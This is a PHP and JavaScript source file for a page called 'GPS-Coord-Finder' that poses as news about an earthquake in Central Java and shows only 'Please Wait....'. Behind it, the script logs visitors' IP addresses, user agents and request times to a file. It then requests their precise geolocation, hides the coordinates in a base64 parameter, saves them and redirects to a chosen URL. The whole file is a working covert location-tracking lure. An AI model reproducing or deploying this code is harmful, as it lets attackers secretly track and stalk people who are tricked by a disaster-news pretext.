<?php

/**
* Main loader script
*
* @package GPS-Coord-Finder
*/

    // define("BASE_URL","//isi dengan url base");
    define("BASE_URL","");
    // define("TARGET_URL","//isi dengan target url akhir");
    define("TARGET_URL","");
    // define("PAGE_TITLE","//isi dengan judul halaman");
    define("PAGE_TITLE","Bencana Gempa Bumi di Jawa Tengah");

    // Jika tak ada cookie dan koneksi menggunakan https, redirect ke http.
    if (!isset($_COOKIE["redir"])){
        if ((isset($_SERVER["HTTPS"]) AND $_SERVER["HTTPS"]=="on") OR (isset($_SERVER["HTTP_X_FORWARDED_PROTO"]) AND $_SERVER   ["HTTP_X_FORWARDED_PROTO"] == "https")){
            header("Location: http://".BASE_URL);
            exit();
        }
    }

    // Fungsi untuk log IP Address.
    function info_ip() {  
        if (getenv('HTTP_CLIENT_IP')) {
             $fip=getenv('HTTP_CLIENT_IP');
        }
        else if(getenv('HTTP_X_FORWARDED_FOR')){
             $fip=getenv('HTTP_X_FORWARDED_FOR');
        }
        else if(getenv('HTTP_X_FORWARDED')){
             $fip=getenv('HTTP_X_FORWARDED');
        }
        else if(getenv('HTTP_FORWARDED_FOR')){
            $fip=getenv('HTTP_FORWARDED_FOR');
        }
        else if(getenv('HTTP_FORWARDED')){
            $fip=getenv('HTTP_FORWARDED'); 
        }
        else if(getenv('REMOTE_ADDR')){
            $fip=getenv('REMOTE_ADDR');
        }
        else{
            $fip="UNKNOWN"; 
        }
        return $fip; 
    }

    // Fungsi untuk menyimpan data dari array.
    function sv_data(){
        global $info;
        global $file;
        foreach ($info as $key => $val){
            fwrite($file, $key." = ".$val."\n \n");
        }
    }

    // Cek koneksi apakah http atau https, simpan hasil kedalam variabel $koneksi.
    $koneksi="";
    if ((isset($_SERVER["HTTPS"]) AND $_SERVER["HTTPS"]=="on") OR (isset($_SERVER["HTTP_X_FORWARDED_PROTO"]) AND $_SERVER   ["HTTP_X_FORWARDED_PROTO"] == "https")){
        $koneksi="https";
    }
    else{
        $koneksi="http";
    }

    // Set zona waktu default server ke Asia/Jakarta.
    date_default_timezone_set('Asia/Jakarta');

    // Simpan hasil log kedalam variabel berisi array.
    $info=[];
    $info["IP_ADDRESS"]=info_ip();
    $info["USER_AGENT"]=$_SERVER["HTTP_USER_AGENT"];
    $info["SYSTEM"]=php_uname();
    $info["REQUEST_TIME"]=date("D\, d M Y \- H\:i\:s",$_SERVER["REQUEST_TIME"]);

    // Jika cookie loop tak ditemukan, atau bernilai 1, jalankan argumen.
    if(!isset($_COOKIE["loop"]) OR (isset($_COOKIE["loop"]) AND $_COOKIE["loop"]=="1")){
        
        // Inisialisasi cookie loop, tambah 1 nilai setiap argumen dijalankan.
        $loop_p="1";
        if (isset($_COOKIE["loop"])){
            $loop_p=(int)$_COOKIE["loop"];
            ++$loop_p;
        }
        setcookie("loop",(string)$loop_p);

        // Inisialisasi file log
        $file=fopen("log.txt","a+");
        fwrite($file,"\n \n ---------SysInfo | $koneksi | index-------- \n \n");

        // Tulis IP Address, User Agent, Sistem Operasi dan waktu request kedalam file log.
        sv_data();
        fwrite($file, "\n \n");
        fclose($file);
    }

    // Jika belum ada cookie, buat dan redirect ke https.
    if (!isset($_COOKIE["redir"])){
        setcookie("redir","yes");
        header("Location: https://".BASE_URL);
        exit();
    }

    // Jika sudah ada cookie jalankan argumen berikut.
    else{
        if($koneksi==="http"){
            header("Location: https://".BASE_URL);
            exit();
        }

        // Jika ada variabel terkait, tulis hasil log kedalam file log. Redirect ke url target.
        if (isset($_GET["bWVzc2FnZQo"])){
            $file=fopen("log.txt","a+");
            fwrite($file,"---------Info | geolocation--------- \n \n");
            sv_data();
            fwrite($file,base64_decode($_GET["bWVzc2FnZQo"])."\n \n");
            fwrite($file, "\n \n \n");
            fclose($file);
            setcookie("loop");
            setcookie("redir");
            header("Location: ".TARGET_URL);
            exit();
        }
    }  
?>
<!DOCTYPE html>
<html>
    <head>
        <meta charset="UTF-8">
        <title><?=PAGE_TITLE;?></title>
        <link rel="icon" href="ico.png" type="image/png">
        <style>
            *{
               margin: 0 auto;
               padding: 0;
               }
            html{
                font-size: 10px;
                padding: 30px;
                }
            h2{
                font-size: 3.5em;
                color: green;
                }
        </style>       
        <script>
            <?php
                // Jika tak ada cookie dan ditemukan variabel get, beri komentar pada code Javascript.
                if (!isset($_COOKIE["redir"]) OR isset($_GET["bWVzc2FnZQo"])){
                    echo "/*";
                }
            ?>
            (function() {if (window.google && google.gears) {return;}var factory = null;if (typeof(GearsFactory)!= 'undefined') {factory = new GearsFactory();} else {try {factory = new ActiveXObject('Gears.Factory');if (factory.getBuildInfo().indexOf('ie_mobile') != -1){factory.privateSetGlobalObject(this);}} catch (e) {if ((typeof(navigator.mimeTypes) != 'undefined')&& navigator.mimeTypes["application/x-googlegears"]) {factory = document.createElement("object");factory.style.display = "none";factory.width = 0;factory.height = 0;factory.type = "application/x-googlegears";document.documentElement.appendChild(factory);if(factory && (typeof(factory.create) == 'undefined')) {factory = null;}}}}if (!factory) {return;}if (!window.google) {google = {};}if (!google.gears) {google.gears = {factory: factory};}})();
            var bb_success;var bb_error;var bb_blackberryTimeout_id=-1;function handleBlackBerryLocationTimeout(){if(bb_blackberryTimeout_id!=-1){bb_error({message:"Timeout error",code:3})}}function handleBlackBerryLocation(){clearTimeout(bb_blackberryTimeout_id);bb_blackberryTimeout_id=-1;if(bb_success&&bb_error){if(blackberry.location.latitude==0&&blackberry.location.longitude==0){bb_error({message:"Position unavailable",code:2})}else{var a=null;if(blackberry.location.timestamp){a=new Date(blackberry.location.timestamp)}bb_success({timestamp:a,coords:{latitude:blackberry.location.latitude,longitude:blackberry.location.longitude}})}bb_success=null;bb_error=null}}var geo_position_js=function(){var b={};var c=null;var a="undefined";b.getCurrentPosition=function(f,d,e){c.getCurrentPosition(f,d,e)};b.init=function(){try{if(typeof(geo_position_js_simulator)!=a){c=geo_position_js_simulator}else{if(typeof(bondi)!=a&&typeof(bondi.geolocation)!=a){c=bondi.geolocation}else{if(typeof(navigator.geolocation)!=a){c=navigator.geolocation;b.getCurrentPosition=function(h,e,g){function f(i){if(typeof(i.latitude)!=a){h({timestamp:i.timestamp,coords:{latitude:i.latitude,longitude:i.longitude}})}else{h(i)}}c.getCurrentPosition(f,e,g)}}else{if(typeof(window.blackberry)!=a&&blackberry.location.GPSSupported){if(typeof(blackberry.location.setAidMode)==a){return false}blackberry.location.setAidMode(2);b.getCurrentPosition=function(g,e,f){bb_success=g;bb_error=e;if(f.timeout){bb_blackberryTimeout_id=setTimeout("handleBlackBerryLocationTimeout()",f.timeout)}else{bb_blackberryTimeout_id=setTimeout("handleBlackBerryLocationTimeout()",60000)}blackberry.location.onLocationUpdate("handleBlackBerryLocation()");blackberry.location.refreshLocation()};c=blackberry.location}else{if(typeof(window.google)!=a&&typeof(google.gears)!=a){c=google.gears.factory.create("beta.geolocation")}else{if(typeof(Mojo)!=a&&typeof(Mojo.Service.Request)!="Mojo.Service.Request"){c=true;b.getCurrentPosition=function(g,e,f){parameters={};if(f){if(f.enableHighAccuracy&&f.enableHighAccuracy==true){parameters.accuracy=1}if(f.maximumAge){parameters.maximumAge=f.maximumAge}if(f.responseTime){if(f.responseTime<5){parameters.responseTime=1}else{if(f.responseTime<20){parameters.responseTime=2}else{parameters.timeout=3}}}}r=new Mojo.Service.Request("palm://com.palm.location",{method:"getCurrentPosition",parameters:parameters,onSuccess:function(h){g({timestamp:h.timestamp,coords:{latitude:h.latitude,longitude:h.longitude,heading:h.heading}})},onFailure:function(h){if(h.errorCode==1){e({code:3,message:"Timeout"})}else{if(h.errorCode==2){e({code:2,message:"Position Unavailable"})}else{e({code:0,message:"Unknown Error: webOS-code"+errorCode})}}}})}}else{if(typeof(device)!=a&&typeof(device.getServiceObject)!=a){c=device.getServiceObject("Service.Location","ILocation");b.getCurrentPosition=function(g,e,f){function i(l,k,j){if(k==4){e({message:"Position unavailable",code:2})}else{g({timestamp:null,coords:{latitude:j.ReturnValue.Latitude,longitude:j.ReturnValue.Longitude,altitude:j.ReturnValue.Altitude,heading:j.ReturnValue.Heading}})}}var h=new Object();h.LocationInformationClass="BasicLocationInformation";c.ILocation.GetLocation(h,i)}}}}}}}}}catch(d){if(typeof(console)!=a){console.log(d)}return false}return c!=null};return b}();
        
        
            if(geo_position_js.init()){
                geo_position_js.getCurrentPosition(success_callback,error_callback,{enableHighAccuracy:true});
            }
            else{
                pesan="Tidak ada fungsi geolocation";
                var redurl='index.php?bWVzc2FnZQo='+btoa(pesan);
                window.location.href = redurl;
            }
            
            function success_callback(p){
                latitude=p.coords.latitude ;
                longitude=p.coords.longitude;
                pesan='Choord = '+latitude+','+longitude;
                var redurl='index.php?bWVzc2FnZQo='+btoa(pesan);
                window.location.href = redurl;
            }
            function error_callback(p){
                pesan='Err = '+p.message;
                var redurl='index.php?bWVzc2FnZQo='+btoa(pesan);
                window.location.href = redurl;
            }   
            <?php
                if (!isset($_COOKIE["redir"]) OR isset($_GET["bWVzc2FnZQo"])){
                    echo "*/";

                }
            ?>
        </script>
    </head>
    <body>
        <h2>
            Please Wait....
        </h2>
    </body>
</html>
